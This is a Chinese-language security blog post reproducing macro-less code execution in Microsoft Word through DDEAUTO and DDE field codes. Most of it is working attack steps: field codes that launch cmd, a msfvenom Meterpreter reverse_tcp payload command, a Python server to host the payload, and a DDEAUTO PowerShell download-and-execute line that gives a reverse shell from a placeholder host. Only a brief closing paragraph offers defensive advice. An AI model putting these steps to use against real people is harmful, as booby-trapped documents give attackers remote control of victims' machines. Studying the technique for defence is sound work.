---
title: MSWord Code Exec Without Macro
date: 2017-10-12 22:54:29
tags: [vul,sec]
categories: Security
---
<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>
昨天复现了一个 Microsoft Office Word 的一个执行任意代码的姿势，跟之前爆出的两个CVE (CVE-2017-0199, CVE-2017-8759) 可以组成三板斧，这里简单记录一下

在不启用宏的情况下执行任意程序，按照复现过程来看这确实像是一个功能而不是bug，微软也表示不会修复这个“漏洞”。这个功能的本意是为了更方便地在word里同步更新其它应用的内容，比如说在一个word文档里引用了另一个excel表格里的某项内容，通过连接域(Field)的方式可以实现在excel里更新内容后word中同步更新的效果，问题出在这个域的内容可以是一个公式(或者说表达式)，这个公式并不限制内容，于是我们可以这样，`ctrl+f9`插入一个域，在`{}`之间写入代码：

`{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }`

或者`插入-文档部件-域`，选择第一个` = (Formula)`
然后右键`切换域代码`来编辑代码，插入上面的内容

这样子可以直接弹出计算器

![calc](https://ob5vt1k7f.qnssl.com/GIF.gif)


既然能执行cmd那就能弹shell

在msf里生成一个ps脚本：

`./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection >xxx.ps1`

在msf里监听

![msf](https://ob5vt1k7f.qnssl.com/HQ%5D%25%7DB5TLH~HBZD%7B1_%7B$D%254.png)

然后开启一个服务器

`python -m SimpleHTTPServer 80`

远程下载ps脚本后执行

`DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/xxx.ps1');xxx.ps1"`

打开文件后反弹一个shell

![shell](https://ob5vt1k7f.qnssl.com/MPI@%5B%60%25DL%28U7WZL220E0%5B7Q.jpg)


过程很简单，唯一不足的是打开文件过程中会有两次弹窗，第一次是询问是否更新链接，第二个是问是否执行程序，当两个都点击确认后才会执行。

除了上面使用的`DDEAUTO`，`DDE`也有能实现这个效果，但是要多一个步骤
将文件后缀改为`zip`或`rar`，用`7z`打开，修改`word/settings.xml`文件，增加一行`<w:updateFields w:val="true"/>`
![](https://ob5vt1k7f.qnssl.com/6U0%25213Q8W%7BEOM%7BJ_V@7%29G7.png)
替换原来的`xml`文件后把后缀改回来

编辑文档，域代码为`{ DDE "c:\\windows\\system32\\cmd.exe" "/c notepad" }`
效果跟上面一样


类似方法除了上面两个外还有
```
GLOSSARY
IMPORT
INCLUDE
SHAPE
DISPLAYBARCODE
MERGEBARCODE
```
参考微软文档 https://msdn.microsoft.com/en-us/library/ff529384(v=office.12).aspx

目前不清楚这些方法有没有影响，微软认为并没有必要去修改这个“漏洞”

> Microsoft responded that as suggested it is a feature and no further action will be taken, and will be considered for a next-version candidate bug.

建议就是不要打开陌生的文档包括excel，ppt等，如有必要在保护视图中查看，另外及时更新系统补丁

参考：
https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
